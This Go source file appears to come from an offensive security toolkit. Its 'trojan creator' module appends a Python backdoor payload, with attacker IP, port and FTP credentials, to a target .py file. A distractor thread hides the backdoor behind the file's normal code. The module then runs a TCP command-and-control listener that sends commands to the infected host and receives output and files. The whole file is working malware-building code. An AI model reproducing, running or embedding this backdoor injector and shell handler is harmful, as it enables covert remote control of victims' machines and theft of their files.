package trojanCreator

import (
	"fmt"
	"net"
	"os"
	
	"github.com/giovanni-iannaccone/ians/pkg/ascii"
	"github.com/giovanni-iannaccone/ians/pkg/console"
	"github.com/giovanni-iannaccone/ians/pkg/tcp"
)

func getOSInfo(conn net.Conn) {
	var os []byte = make([]byte, 64)
	n, _ := conn.Read(os)
	console.Println(console.BoldBlue, "Target's OS is %s", string(os[:n]))
}

func handle(conn net.Conn) {
	var cmd string
	var data []byte = make([]byte, 8192)

	getOSInfo(conn)

	for {
        console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter a command:~# ")
		console.Scan(&cmd)
		
        if cmd == "help" {
            showOptions()

		} else {
            conn.Write([]byte(cmd))

			n, err := conn.Read(data)
			if err != nil {
            	console.Error(err.Error())
			} else {
				console.Println(console.BoldGreen, "--OUTPUT--")
				console.Println(console.Green, "%s", string(data[:n]))
			}
		}
	}
}

func inject(ip string, port uint, file string, ftpCredentials []string) error {
	fd, err := os.OpenFile(file, os.O_APPEND|os.O_WRONLY|os.O_CREATE, os.ModeAppend)
	if err != nil {
		return err
	}

	defer fd.Close()

	buffer, err := os.ReadFile("internal/trojanCreator/utils/trojan.py")
	if err != nil {
		return err
	}

	fd.Write(buffer)
	fd.Write([]byte(fmt.Sprintf("\n    IP=\"%s\";PORT=%d", ip, port)))
	fd.Write([]byte(fmt.Sprintf("\n    ftp_credentials=%s", console.FmtArray(ftpCredentials))))
	fd.Write([]byte("\n    distractor_thread = threading.Thread(target=main);trojan_thread = threading.Thread(target=trojan)"))
    fd.Write([]byte("\n    distractor_thread.start();trojan_thread.start()"))

	return nil
}

func showOptions() {
	console.Println(console.BoldBlue, "cmdon"  + console.Reset + "\t\tto active the terminal mode")
    console.Println(console.BoldBlue, "cmdoff" + console.Reset + "\t\tto disactive the terminal mode\n")

	console.Println(console.BoldBlue, "ftp::recv" + console.Reset + "\tto receive a file")
    console.Println(console.BoldBlue, "ftp::cd"   + console.Reset + "\t\tto change the directory a file")
}

func takeData() (string, uint) {
	var ip string
	var port uint

	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter your ip: ")
	fmt.Scanf("%s", &ip)

	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter your port: ")
	fmt.Scanf("%d", &port)

	return ip, port
}

func takeFtpCredentials() []string {
	var ftpAddress string 
	var ftpPasswd string
	var ftpUsername string
	
	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter the address of the ftp server: ")
	fmt.Scanf("%s", &ftpAddress)
    
	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter the username to login: ")
	fmt.Scanf("%s", &ftpUsername)

	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter the password to login: ")
    fmt.Scanf("%s", &ftpPasswd)

	return []string{ftpAddress, ftpUsername, ftpPasswd}
}

func Initialize() {
	ascii.TrojanCreator()
	console.Println(console.BoldRed, "A tool for simple trojan creation")

	ip, port := takeData()
	
	var file string
	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter the py file where you want to inject the backdoor: ")
	fmt.Scanf("%s", &file)

	var ftpCredentials []string = takeFtpCredentials()

	err := inject(ip, port, file, ftpCredentials)
	if err != nil {
		console.Fatal(err.Error())
	}

	console.Println(console.BoldGreen, "Starting server on port %d", port)
	err = tcp.StartTcpServer(ip, port, 1, handle)
	if err != nil {
		console.Fatal(err.Error())
	}
}